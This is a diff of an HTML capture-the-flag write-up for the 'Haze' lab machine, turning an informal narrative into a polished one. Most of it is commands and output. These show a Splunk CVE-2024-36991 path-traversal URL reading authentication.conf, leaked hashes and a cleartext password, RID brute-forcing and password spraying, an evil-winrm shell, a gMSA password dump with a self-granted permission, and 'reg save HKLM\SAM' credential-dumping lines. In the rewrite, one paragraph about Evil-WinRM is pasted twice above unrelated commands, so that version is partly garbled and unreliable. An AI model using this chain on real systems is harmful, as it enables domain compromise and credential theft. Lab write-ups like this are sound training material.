+49668/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49674/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+49683/tcp open  ncacn_http    syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
+49684/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+54425/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+54430/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+54432/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+54445/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
+54494/tcp open  msrpc         syn-ack ttl 127 Microsoft Windows RPC
 Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
 
 Host script results:
 | smb2-time: 
-| date: 2025-04-08T01:41:44
-|_ start_date: N/A
+|   date: 2025-04-08T01:41:44
+|_  start_date: N/A
 |_clock-skew: 3h02m13s
 | p2p-conficker: 
-| Checking for Conficker.C or higher...
-| Check 1 (port 18645/tcp): CLEAN (Couldn&#x27;t connect)
-| Check 2 (port 57548/tcp): CLEAN (Couldn&#x27;t connect)
-| Check 3 (port 58911/udp): CLEAN (Timeout)
-| Check 4 (port 60615/udp): CLEAN (Failed to receive data)
-|_ 0/4 checks are positive: Host is CLEAN or ports are blocked
+|   Checking for Conficker.C or higher...
+|   Check 1 (port 18645/tcp): CLEAN (Couldn&#x27;t connect)
+|   Check 2 (port 57548/tcp): CLEAN (Couldn&#x27;t connect)
+|   Check 3 (port 58911/udp): CLEAN (Timeout)
+|   Check 4 (port 60615/udp): CLEAN (Failed to receive data)
+|_  0/4 checks are positive: Host is CLEAN or ports are blocked
 | smb2-security-mode: 
-| 3:1:1: 
-|_ Message signing enabled and required
+|   3:1:1: 
+|_    Message signing enabled and required
 
 Nmap done: 1 IP address (1 host up) scanned in 72.90 seconds
- Raw packets sent: 34 (1.472KB) | Rcvd: 33 (1.428KB)</code></pre></div>
-      <p>The only thing we know is that we can go to the following URL http://10.129.97.167:8000/en-US/account/login?return_to=%2Fen-US%2F, this is because we got it from the nmap command. This webpage is the administrator login page. We will be able to use it later to set up the reversed shell connection between my own machine and the windows machine.</p>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250407200026.png" alt="Pasted image 20250407200026.png" loading="lazy" /><span class="img-caption">Pasted image 20250407200026.png</span></div>
-      <p>Now if we start looking at the URL we can&#x27;t do too much, so I started looking for an exploit for the splunk webpage. Before I can start looking for the exploit I need to know the version. This I went to look for at the following URL to go: https://10.129.97.167:8089/</p>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250407204114.png" alt="Pasted image 20250407204114.png" loading="lazy" /><span class="img-caption">Pasted image 20250407204114.png</span></div>
-      <p>Above we can see that splunk&#x27;s webpage is running on version 9.2.1. So now I started to look for an exploit of splunk with a version 9.2.1 and came across the following exploit. https://github.com/bigb0x/CVE-2024-36991.
-So now I will run the following exploit so that I can get the users hash for logging in to the splunk webpage. As you can see below I got the hashes of 4 users.</p>
-      <div class="code-block"><pre><code>python3 CVE-2024-36991.py -u http://10.129.97.167:8000 
+           Raw packets sent: 34 (1.472KB) | Rcvd: 33 (1.428KB)</code></pre></div>
+      <h3 class="writeup-sub-title">Splunk Web Interface</h3>
+      <p>Port 8000 hosts the Splunk web login page. Version fingerprinting confirms <strong>Splunk Enterprise 9.2.1</strong>.</p>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250407200026.png" alt="Splunk login page" loading="lazy" /><span class="img-caption">Splunk login page</span></div>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250407204114.png" alt="Splunk version 9.2.1 confirmed" loading="lazy" /><span class="img-caption">Splunk version 9.2.1 confirmed</span></div>
+      <h2 class="writeup-section-title">Foothold: Splunk CVE-2024-36991 (Path Traversal)</h2>
+      <p>Searching for Splunk 9.2.1 exploits, I find <strong>CVE-2024-36991</strong> — a path traversal vulnerability that allows reading arbitrary files from the server. I first attempt to extract password hashes from the Splunk <code>passwd</code> file.</p>
+      <div class="code-block"><pre><code>python3 CVE-2024-36991.py -u http://10.129.97.167:8000                                          
 /home/kali/HTB/Haze/CVE-2024-36991/CVE-2024-36991.py:53: SyntaxWarning: invalid escape sequence &#x27;\ &#x27;
- &quot;&quot;&quot;)
+  &quot;&quot;&quot;)
 
- 
- ______ _______ ____ ___ ____ _ _ _____ __ ___ ___ _ 
- / ___\ \ / | ____| |___ \ / _ |___ \| || | |___ / / /_ / _ \ / _ \/ | 
-| | \ \ / /| _| _____ __) | | | |__) | || |_ _____ |_ \| &#x27;_ | (_) | (_) | | 
-| |___ \ V / | |__|_____/ __/| |_| / __/|__ _|________) | (_) \__, |\__, | | 
- \____| \_/ |_____| |_____|\___|_____| |_| |____/ \___/ /_/ /_/|_| 
- 
--&gt; POC CVE-2024-36991. This exploit will attempt to read Splunk /etc/passwd file. 
+                                                                        
+  ______     _______     ____   ___ ____  _  _        _____  __   ___   ___  _                                      
+ / ___\ \   / | ____|   |___ \ / _ |___ \| || |      |___ / / /_ / _ \ / _ \/ |                                     
+| |    \ \ / /|  _| _____ __) | | | |__) | || |_ _____ |_ \| &#x27;_ | (_) | (_) | |                                     
+| |___  \ V / | |__|_____/ __/| |_| / __/|__   _|________) | (_) \__, |\__, | |                                     
+ \____|  \_/  |_____|   |_____|\___|_____|  |_|      |____/ \___/  /_/   /_/|_|                                     
+                                                                                                                    
+-&gt; POC CVE-2024-36991. This exploit will attempt to read Splunk /etc/passwd file.                                   
 -&gt; By x.com/MohamedNab1l
 -&gt; Use Wisely.
 
@@ -571,175 +280,170 @@ So now I will run the following exploit so that I can get the users hash for log
 :edward:$6$3LQHFzfmlpMgxY57$Sk32K6eknpAtcT23h6igJRuM1eCe7WAfygm103cQ22/Niwp1pTCKzc0Ok1qhV25UsoUN4t7HYfoGDb4ZCv8pw1::Edward@haze.htb:user:Edward@haze.htb:::20152
 :mark:$6$j4QsAJiV8mLg/bhA$Oa/l2cgCXF8Ux7xIaDe3dMW6.Qfobo0PtztrVMHZgdGa1j8423jUvMqYuqjZa/LPd.xryUwe699/8SgNC6v2H/:::user:Mark@haze.htb:::20152
 :paul:$6$Y5ds8NjDLd7SzOTW$Zg/WOJxk38KtI.ci9RFl87hhWSawfpT6X.woxTvB4rduL4rDKkE.psK7eXm6TgriABAhqdCPI4P0hcB8xz0cd1:::user:paul@haze.htb:::20152</code></pre></div>
-      <p>I will now go and decode the hashes for finding their passwords. I will start doing this by using the following command.</p>
+      <p>I crack the extracted hash using <strong>John the Ripper</strong> with the <code>rockyou.txt</code> wordlist.</p>
       <div class="code-block"><pre><code>john --format=sha512crypt --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt 
 Using default input encoding: UTF-8
 Loaded 4 password hashes with 4 different salts (sha512crypt, crypt(3) $6$ [SHA512 128/128 AVX 2x])
 Cost 1 (iteration count) is 5000 for all loaded hashes
 Will run 4 OpenMP threads
 Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for status</code></pre></div>
-      <p>After the long wait, I noticed that there was just no movement. So the hashes were a dead end. So this means that the hashes are not crackable, so now I will have to find another way to find a vulnerability.</p>
-      <p>I started searching and I saw that you can also do LFI. So by using the following documentation page of splunk https://docs.splunk.com/Special:SplunkSearch/docs?q=authentication.conf&amp;size=n_10_n&amp;filters%5B0%5D%5Bfield%5D=source_name_s&amp;filters%5B0%5D%5Bvalues%5D%5B0%5D=Docs&amp;filters%5B0%5D%5Btype%5D=any and chatgpt I came up with the following path that I can start using.</p>
-      <p>With this code I will start to see the data that that is in the Authentication.conf. Within the Authentication.conf file there are passwords, usernames, hashed passwords that that is going to be able to be used for logging into the splunk web server or for further exploiting the machine in my case.</p>
+      <p>The hashes resist cracking. I pivot to reading the <code>authentication.conf</code> file via the same LFI technique, which stores LDAP bind credentials in plaintext when external authentication is configured.</p>
       <div class="code-block"><pre><code>http://10.129.97.167:8000/en-US/modules/messaging/C%3A../C%3A../C%3A../C%3A../C%3A../C%3A../C%3A../C%3A../Program%20Files/Splunk/etc/system/local/authentication.conf
 
 [splunk_auth] minPasswordLength = 8 minPasswordUppercase = 0 minPasswordLowercase = 0 minPasswordSpecial = 0 minPasswordDigit = 0 [Haze LDAP Auth] SSLEnabled = 0 anonymous_referrals = 1 bindDN = CN=Paul Taylor,CN=Users,DC=haze,DC=htb bindDNpassword = $7$ndnYiCPhf4lQgPhPu7Yz1pvGm66Nk0PpYcLN+qt1qyojg4QU+hKteemWQGUuTKDVlWbO8pY= charset = utf8 emailAttribute = mail enableRangeRetrieval = 0 groupBaseDN = CN=Splunk_LDAP_Auth,CN=Users,DC=haze,DC=htb groupMappingAttribute = dn groupMemberAttribute = member groupNameAttribute = cn host = dc01.haze.htb nestedGroups = 0 network_timeout = 20 pagelimit = -1 port = 389 realNameAttribute = cn sizelimit = 1000 timelimit = 15 userBaseDN = CN=Users,DC=haze,DC=htb userNameAttribute = samaccountname [authentication] authSettings = Haze LDAP Auth authType = LDAP</code></pre></div>
-      <p>Above you can start to see that there is a hash that is that of the user paul taylor. I will now try to decode this hash. The hash code is a yesccrypt, yescrypt is a modern hashing method designed for storing passwords securely. It is based on scrypt and uses memory in addition to CPU, making brute-force attacks much harder and slower.</p>
-      <p>I used the following command to see which users are known. Now that I know the password of the user paul.taylor, I used CrackMapExec to see which users exist on the windows machine without needing to know their password.</p>
-      <div class="code-block"><pre><code>crackmapexec smb 10.129.232.50 -u paul.taylor -p Ld@p_Auth_Sp1unk@2k24 --rid-brute 
+      <p>The file reveals a cleartext password for user <code>paul.taylor</code>.</p>
+      <h3 class="writeup-sub-title">AD User Enumeration</h3>
+      <p>Using the recovered credentials, I perform a RID brute-force to enumerate all domain users, then test password reuse across accounts via WinRM.</p>
+      <div class="code-block"><pre><code>crackmapexec smb 10.129.232.50 -u paul.taylor -p Ld@p_Auth_Sp1unk@2k24 --rid-brute         
 /usr/lib/python3/dist-packages/cme/cli.py:37: SyntaxWarning: invalid escape sequence &#x27;\ &#x27;
- formatter_class=RawTextHelpFormatter)
+  formatter_class=RawTextHelpFormatter)
 /usr/lib/python3/dist-packages/cme/protocols/winrm.py:324: SyntaxWarning: invalid escape sequence &#x27;\S&#x27;
- self.conn.execute_cmd(&quot;reg save HKLM\SAM C:\\windows\\temp\\SAM &amp;&amp; reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM&quot;)
+  self.conn.execute_cmd(&quot;reg save HKLM\SAM C:\\windows\\temp\\SAM &amp;&amp; reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM&quot;)
 /usr/lib/python3/dist-packages/cme/protocols/winrm.py:338: SyntaxWarning: invalid escape sequence &#x27;\S&#x27;
- self.conn.execute_cmd(&quot;reg save HKLM\SECURITY C:\\windows\\temp\\SECURITY &amp;&amp; reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM&quot;)
+  self.conn.execute_cmd(&quot;reg save HKLM\SECURITY C:\\windows\\temp\\SECURITY &amp;&amp; reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM&quot;)
 /usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:49: SyntaxWarning: invalid escape sequence &#x27;\p&#x27;
- stringbinding = &#x27;ncacn_np:%s[\pipe\svcctl]&#x27; % self.__host
+  stringbinding = &#x27;ncacn_np:%s[\pipe\svcctl]&#x27; % self.__host
 /usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:93: SyntaxWarning: invalid escape sequence &#x27;\{&#x27;
- command = self.__shell + &#x27;echo &#x27;+ data + &#x27; ^&gt; \\\\127.0.0.1\\{}\\{} 2^&gt;^&amp;1 &gt; %TEMP%\{} &amp; %COMSPEC% /Q /c %TEMP%\{} &amp; %COMSPEC% /Q /c del %TEMP%\{}&#x27;.format(self.__share_name, self.__output, self.__batchFile, self.__batchFile, self.__batchFile)
-SMB 10.129.232.50 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
-SMB 10.129.232.50 445 DC01 [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24 
-SMB 10.129.232.50 445 DC01 [+] Brute forcing RIDs
-SMB 10.129.232.50 445 DC01 498: HAZE\Enterprise Read-only Domain Controllers (SidTypeGroup)
-SMB 10.129.232.50 445 DC01 500: HAZE\Administrator (SidTypeUser)
-SMB 10.129.232.50 445 DC01 501: HAZE\Guest (SidTypeUser)
-SMB 10.129.232.50 445 DC01 502: HAZE\krbtgt (SidTypeUser)
-SMB 10.129.232.50 445 DC01 512: HAZE\Domain Admins (SidTypeGroup)
-SMB 10.129.232.50 445 DC01 513: HAZE\Domain Users (SidTypeGroup)
-SMB 10.129.232.50 445 DC01 514: HAZE\Domain Guests (SidTypeGroup)
-SMB 10.129.232.50 445 DC01 515: HAZE\Domain Computers (SidTypeGroup)
-SMB 10.129.232.50 445 DC01 516: HAZE\Domain Controllers (SidTypeGroup)
-SMB 10.129.232.50 445 DC01 517: HAZE\Cert Publishers (SidTypeAlias)
-SMB 10.129.232.50 445 DC01 518: HAZE\Schema Admins (SidTypeGroup)
-SMB 10.129.232.50 445 DC01 519: HAZE\Enterprise Admins (SidTypeGroup)
-SMB 10.129.232.50 445 DC01 520: HAZE\Group Policy Creator Owners (SidTypeGroup)
-SMB 10.129.232.50 445 DC01 521: HAZE\Read-only Domain Controllers (SidTypeGroup)
-SMB 10.129.232.50 445 DC01 522: HAZE\Cloneable Domain Controllers (SidTypeGroup)
-SMB 10.129.232.50 445 DC01 525: HAZE\Protected Users (SidTypeGroup)
-SMB 10.129.232.50 445 DC01 526: HAZE\Key Admins (SidTypeGroup)
-SMB 10.129.232.50 445 DC01 527: HAZE\Enterprise Key Admins (SidTypeGroup)
-SMB 10.129.232.50 445 DC01 553: HAZE\RAS and IAS Servers (SidTypeAlias)
-SMB 10.129.232.50 445 DC01 571: HAZE\Allowed RODC Password Replication Group (SidTypeAlias)
-SMB 10.129.232.50 445 DC01 572: HAZE\Denied RODC Password Replication Group (SidTypeAlias)
-SMB 10.129.232.50 445 DC01 1000: HAZE\DC01$ (SidTypeUser)
-SMB 10.129.232.50 445 DC01 1101: HAZE\DnsAdmins (SidTypeAlias)
-SMB 10.129.232.50 445 DC01 1102: HAZE\DnsUpdateProxy (SidTypeGroup)
-SMB 10.129.232.50 445 DC01 1103: HAZE\paul.taylor (SidTypeUser)
-SMB 10.129.232.50 445 DC01 1104: HAZE\mark.adams (SidTypeUser)
-SMB 10.129.232.50 445 DC01 1105: HAZE\edward.martin (SidTypeUser)
-SMB 10.129.232.50 445 DC01 1106: HAZE\alexander.green (SidTypeUser)
-SMB 10.129.232.50 445 DC01 1107: HAZE\gMSA_Managers (SidTypeGroup)
-SMB 10.129.232.50 445 DC01 1108: HAZE\Splunk_Admins (SidTypeGroup)
-SMB 10.129.232.50 445 DC01 1109: HAZE\Backup_Reviewers (SidTypeGroup)
-SMB 10.129.232.50 445 DC01 1110: HAZE\Splunk_LDAP_Auth (SidTypeGroup)
-SMB 10.129.232.50 445 DC01 1111: HAZE\Haze-IT-Backup$ (SidTypeUser)
-SMB 10.129.232.50 445 DC01 1112: HAZE\Support_Services (SidTypeGroup)</code></pre></div>
-      <p>I will now create a file with all the usernames in it so that if I can then try to see which user I can log on to the windows machine with the same password as Paul.Taylor. I will start doing this by using the following command.</p>
+  command = self.__shell + &#x27;echo &#x27;+ data + &#x27; ^&gt; \\\\127.0.0.1\\{}\\{} 2^&gt;^&amp;1 &gt; %TEMP%\{} &amp; %COMSPEC% /Q /c %TEMP%\{} &amp; %COMSPEC% /Q /c del %TEMP%\{}&#x27;.format(self.__share_name, self.__output, self.__batchFile, self.__batchFile, self.__batchFile)
+SMB         10.129.232.50   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
+SMB         10.129.232.50   445    DC01             [+] haze.htb\paul.taylor:Ld@p_Auth_Sp1unk@2k24 
+SMB         10.129.232.50   445    DC01             [+] Brute forcing RIDs
+SMB         10.129.232.50   445    DC01             498: HAZE\Enterprise Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.232.50   445    DC01             500: HAZE\Administrator (SidTypeUser)
+SMB         10.129.232.50   445    DC01             501: HAZE\Guest (SidTypeUser)
+SMB         10.129.232.50   445    DC01             502: HAZE\krbtgt (SidTypeUser)
+SMB         10.129.232.50   445    DC01             512: HAZE\Domain Admins (SidTypeGroup)
+SMB         10.129.232.50   445    DC01             513: HAZE\Domain Users (SidTypeGroup)
+SMB         10.129.232.50   445    DC01             514: HAZE\Domain Guests (SidTypeGroup)
+SMB         10.129.232.50   445    DC01             515: HAZE\Domain Computers (SidTypeGroup)
+SMB         10.129.232.50   445    DC01             516: HAZE\Domain Controllers (SidTypeGroup)
+SMB         10.129.232.50   445    DC01             517: HAZE\Cert Publishers (SidTypeAlias)
+SMB         10.129.232.50   445    DC01             518: HAZE\Schema Admins (SidTypeGroup)
+SMB         10.129.232.50   445    DC01             519: HAZE\Enterprise Admins (SidTypeGroup)
+SMB         10.129.232.50   445    DC01             520: HAZE\Group Policy Creator Owners (SidTypeGroup)
+SMB         10.129.232.50   445    DC01             521: HAZE\Read-only Domain Controllers (SidTypeGroup)
+SMB         10.129.232.50   445    DC01             522: HAZE\Cloneable Domain Controllers (SidTypeGroup)
+SMB         10.129.232.50   445    DC01             525: HAZE\Protected Users (SidTypeGroup)
+SMB         10.129.232.50   445    DC01             526: HAZE\Key Admins (SidTypeGroup)
+SMB         10.129.232.50   445    DC01             527: HAZE\Enterprise Key Admins (SidTypeGroup)
+SMB         10.129.232.50   445    DC01             553: HAZE\RAS and IAS Servers (SidTypeAlias)
+SMB         10.129.232.50   445    DC01             571: HAZE\Allowed RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.232.50   445    DC01             572: HAZE\Denied RODC Password Replication Group (SidTypeAlias)
+SMB         10.129.232.50   445    DC01             1000: HAZE\DC01$ (SidTypeUser)
+SMB         10.129.232.50   445    DC01             1101: HAZE\DnsAdmins (SidTypeAlias)
+SMB         10.129.232.50   445    DC01             1102: HAZE\DnsUpdateProxy (SidTypeGroup)
+SMB         10.129.232.50   445    DC01             1103: HAZE\paul.taylor (SidTypeUser)
+SMB         10.129.232.50   445    DC01             1104: HAZE\mark.adams (SidTypeUser)
+SMB         10.129.232.50   445    DC01             1105: HAZE\edward.martin (SidTypeUser)
+SMB         10.129.232.50   445    DC01             1106: HAZE\alexander.green (SidTypeUser)
+SMB         10.129.232.50   445    DC01             1107: HAZE\gMSA_Managers (SidTypeGroup)
+SMB         10.129.232.50   445    DC01             1108: HAZE\Splunk_Admins (SidTypeGroup)
+SMB         10.129.232.50   445    DC01             1109: HAZE\Backup_Reviewers (SidTypeGroup)
+SMB         10.129.232.50   445    DC01             1110: HAZE\Splunk_LDAP_Auth (SidTypeGroup)
+SMB         10.129.232.50   445    DC01             1111: HAZE\Haze-IT-Backup$ (SidTypeUser)
+SMB         10.129.232.50   445    DC01             1112: HAZE\Support_Services (SidTypeGroup)</code></pre></div>
+      <p>I test the credentials against WinRM across all discovered users to identify which accounts allow remote access.</p>
       <div class="code-block"><pre><code>crackmapexec winrm 10.129.232.50 -u user.txt -p Ld@p_Auth_Sp1unk@2k24 --continue-on-succes 
 /usr/lib/python3/dist-packages/cme/cli.py:37: SyntaxWarning: invalid escape sequence &#x27;\ &#x27;
- formatter_class=RawTextHelpFormatter)
+  formatter_class=RawTextHelpFormatter)
 /usr/lib/python3/dist-packages/cme/protocols/winrm.py:324: SyntaxWarning: invalid escape sequence &#x27;\S&#x27;
- self.conn.execute_cmd(&quot;reg save HKLM\SAM C:\\windows\\temp\\SAM &amp;&amp; reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM&quot;)
+  self.conn.execute_cmd(&quot;reg save HKLM\SAM C:\\windows\\temp\\SAM &amp;&amp; reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM&quot;)
 /usr/lib/python3/dist-packages/cme/protocols/winrm.py:338: SyntaxWarning: invalid escape sequence &#x27;\S&#x27;
- self.conn.execute_cmd(&quot;reg save HKLM\SECURITY C:\\windows\\temp\\SECURITY &amp;&amp; reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM&quot;)
+  self.conn.execute_cmd(&quot;reg save HKLM\SECURITY C:\\windows\\temp\\SECURITY &amp;&amp; reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM&quot;)
 /usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:49: SyntaxWarning: invalid escape sequence &#x27;\p&#x27;
- stringbinding = &#x27;ncacn_np:%s[\pipe\svcctl]&#x27; % self.__host
+  stringbinding = &#x27;ncacn_np:%s[\pipe\svcctl]&#x27; % self.__host
 /usr/lib/python3/dist-packages/cme/protocols/smb/smbexec.py:93: SyntaxWarning: invalid escape sequence &#x27;\{&#x27;
- command = self.__shell + &#x27;echo &#x27;+ data + &#x27; ^&gt; \\\\127.0.0.1\\{}\\{} 2^&gt;^&amp;1 &gt; %TEMP%\{} &amp; %COMSPEC% /Q /c %TEMP%\{} &amp; %COMSPEC% /Q /c del %TEMP%\{}&#x27;.format(self.__share_name, self.__output, self.__batchFile, self.__batchFile, self.__batchFile)
+  command = self.__shell + &#x27;echo &#x27;+ data + &#x27; ^&gt; \\\\127.0.0.1\\{}\\{} 2^&gt;^&amp;1 &gt; %TEMP%\{} &amp; %COMSPEC% /Q /c %TEMP%\{} &amp; %COMSPEC% /Q /c del %TEMP%\{}&#x27;.format(self.__share_name, self.__output, self.__batchFile, self.__batchFile, self.__batchFile)
 /usr/lib/python3/dist-packages/cme/protocols/winrm.py:324: SyntaxWarning: invalid escape sequence &#x27;\S&#x27;
- self.conn.execute_cmd(&quot;reg save HKLM\SAM C:\\windows\\temp\\SAM &amp;&amp; reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM&quot;)
+  self.conn.execute_cmd(&quot;reg save HKLM\SAM C:\\windows\\temp\\SAM &amp;&amp; reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM&quot;)
 /usr/lib/python3/dist-packages/cme/protocols/winrm.py:338: SyntaxWarning: invalid escape sequence &#x27;\S&#x27;
- self.conn.execute_cmd(&quot;reg save HKLM\SECURITY C:\\windows\\temp\\SECURITY &amp;&amp; reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM&quot;)
-SMB 10.129.232.50 5985 DC01 [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb)
-HTTP 10.129.232.50 5985 DC01 [*] http://10.129.232.50:5985/wsman
+  self.conn.execute_cmd(&quot;reg save HKLM\SECURITY C:\\windows\\temp\\SECURITY &amp;&amp; reg save HKLM\SYSTEM C:\\windows\\temp\\SYSTEM&quot;)
+SMB         10.129.232.50   5985   DC01             [*] Windows Server 2022 Build 20348 (name:DC01) (domain:haze.htb)
+HTTP        10.129.232.50   5985   DC01             [*] http://10.129.232.50:5985/wsman
 /usr/lib/python3/dist-packages/spnego/_ntlm_raw/crypto.py:46: CryptographyDeprecationWarning: ARC4 has been moved to cryptography.hazmat.decrepit.ciphers.algorithms.ARC4 and will be removed from this module in 48.0.0.
- arc4 = algorithms.ARC4(self._key)
-WINRM 10.129.232.50 5985 DC01 [-] haze.htb\user.txt:Ld@p_Auth_Sp1unk@2k24</code></pre></div>
-      <p>So above you can see that I can log into the windows machine with the user mark.adams. Before doing this I will get all the data from the server so that I can set it up in my bloodhound. You can do this by using the following command. With this command you will extract all data from the AD and put it in a zip file. Then you can unzip the zip file and upload all the data into Bloodhound.</p>
+  arc4 = algorithms.ARC4(self._key)
+WINRM       10.129.232.50   5985   DC01             [-] haze.htb\user.txt:Ld@p_Auth_Sp1unk@2k24</code></pre></div>
+      <p>The password works for user <code>mark.adams</code> on WinRM. I collect LDAP data for BloodHound.</p>
       <div class="code-block"><pre><code>nxc ldap 10.129.232.50 -u mark.adams -p Ld@p_Auth_Sp1unk@2k24 --bloodhound --collection All --dns-server 10.129.232.50
-SMB 10.129.232.50 445 DC01 [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
-LDAP 10.129.232.50 389 DC01 [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24 
-LDAP 10.129.232.50 389 DC01 Resolved collection methods: localadmin, session, dcom, psremote, container, acl, rdp, objectprops, trusts, group 
-LDAP 10.129.232.50 389 DC01 Done in 00M 05S
-LDAP 10.129.232.50 389 DC01 Compressing output into /home/kali/.nxc/logs/DC01_10.129.232.50_2025-04-08_233341_bloodhound.zip</code></pre></div>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250415202416.png" alt="Pasted image 20250415202416.png" loading="lazy" /><span class="img-caption">Pasted image 20250415202416.png</span></div>
-      <p>Now that I have uploaded my files in bloodhound I can take a look on the windows machine by logging in as user mark.adams.</p>
+SMB         10.129.232.50   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:haze.htb) (signing:True) (SMBv1:False)
+LDAP        10.129.232.50   389    DC01             [+] haze.htb\mark.adams:Ld@p_Auth_Sp1unk@2k24 
+LDAP        10.129.232.50   389    DC01             Resolved collection methods: localadmin, session, dcom, psremote, container, acl, rdp, objectprops, trusts, group                                                                   
+LDAP        10.129.232.50   389    DC01             Done in 00M 05S
+LDAP        10.129.232.50   389    DC01             Compressing output into /home/kali/.nxc/logs/DC01_10.129.232.50_2025-04-08_233341_bloodhound.zip</code></pre></div>
+      <div class="screenshot-wrap"><img src="assets/Pasted image 20250415202416.png" alt="BloodHound data uploaded" loading="lazy" /><span class="img-caption">BloodHound data uploaded</span></div>
+      <h2 class="writeup-section-title">User Flag: gMSA & Shadow Credentials Chain</h2>
+      <h3 class="writeup-sub-title">WinRM Access</h3>
+      <p>I establish a WinRM session as <code>mark.adams</code> using Evil-WinRM. This gives me an interactive PowerShell shell on the domain-joined Windows machine, from which I can enumerate the local system, access files, and interact with Active Directory objects.</p>
       <div class="code-block"><pre><code>evil-winrm -u mark.adams -p Ld@p_Auth_Sp1unk@2k24 -i 10.129.232.50 
- 
+                                        
 Evil-WinRM shell v3.7
- 
+                                        
 Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#x27; for module Reline
- 
+                                        
 Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
- 
+                                        
 Info: Establishing connection to remote endpoint
 *Evil-WinRM* PS C:\Users\mark.adams\Documents&gt;</code></pre></div>
-      <p>On the windows machine, there wasn&#x27;t anything I could see with which to proceed immediately. So I went to take another look on my bloodhound. I know that I can get the user paul.taylor and mark.adams by using the following password “Ld@p_Auth_Sp1unk@2k24” for both users. If I now search in bloodhound for whose users the following are members I get the following data.</p>
-      <p>Paul.taylor</p>
-      <p>mark.adams</p>
-      <div class="screenshot-wrap"><img src="assets/Pasted image 20250408213816.png" alt="Pasted image 20250408213816.png" loading="lazy" /><span class="img-caption">Pasted image 20250408213816.png</span></div>
-      <p>What is gMSA explained in brief?
-gMSA = Group Managed Service Account
-This is a special kind of AD account that is automatically given a strong password by the system, which rotates periodically</p>
-      <p>I am going to do this using the following tool. https://github.com/micahvandeusen/gMSADumper</p>
+      <h3 class="writeup-sub-title">gMSA Password Dump</h3>
+      <p>BloodHound reveals <code>mark.adams</code> can read a <strong>gMSA</strong> (Group Managed Service Account) password. I configure the appropriate permissions and dump the hash using <code>gMSADumper.py</code>.</p>
       <div class="code-block"><pre><code>python3 gMSADumper.py -u mark.adams -p Ld@p_Auth_Sp1unk@2k24 -d haze.htb -l dc01.haze.htb
 Users or groups who can read password for Haze-IT-Backup$:
  &gt; Domain Admins</code></pre></div>
-      <p>So I went to my machine with which that I am connected to mark.adams. I will go here now to see if it is a gmsa account. Just to double check that I did this to see if I was doing it right. I did this by entering the following command:</p>
+      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\&gt; Get-ADServiceAccount -Identity Haze-IT-Backup$ | Select-Object Name, ObjectClass
 
-Name ObjectClass
----- -----------
+Name           ObjectClass
+----           -----------
 Haze-IT-Backup msDS-GroupManagedServiceAccount</code></pre></div>
-      <p>So now with the following command I will say that the user mark.adams is allowed to retrieve the gmsa password/password hashes, which means that we will then most likely see the hash of haze-it-backup. With this command you will add mark.adams to the list that may retrieve the password of in this case Haze-IT-Backup$.</p>
+      <p>I use <strong>Evil-WinRM</strong> to establish a remote PowerShell session on the target Windows machine. Evil-WinRM leverages the Windows Remote Management (WinRM) protocol over HTTP/HTTPS (port 5985/5986) and supports Pass-the-Hash authentication, file upload/download, and in-memory PowerShell execution — making it the preferred tool for post-exploitation on Windows targets.</p>
       <div class="code-block"><pre><code>*Evil-WinRM* PS C:\&gt; Set-ADServiceAccount -Identity &quot;Haze-IT-Backup$&quot; -PrincipalsAllowedToRetrieveManagedPassword &quot;mark.adams&quot;</code></pre></div>
-      <p>The dsacls command is used to display and manage the access rights (ACLs) of Active Directory objects. It allows you to see exactly which users or groups have rights to a particular object, such as read, write, modify or full control. So I went to look at the access rights of the user HAZE-IT-BACKUP$ in Active Directory.</p>
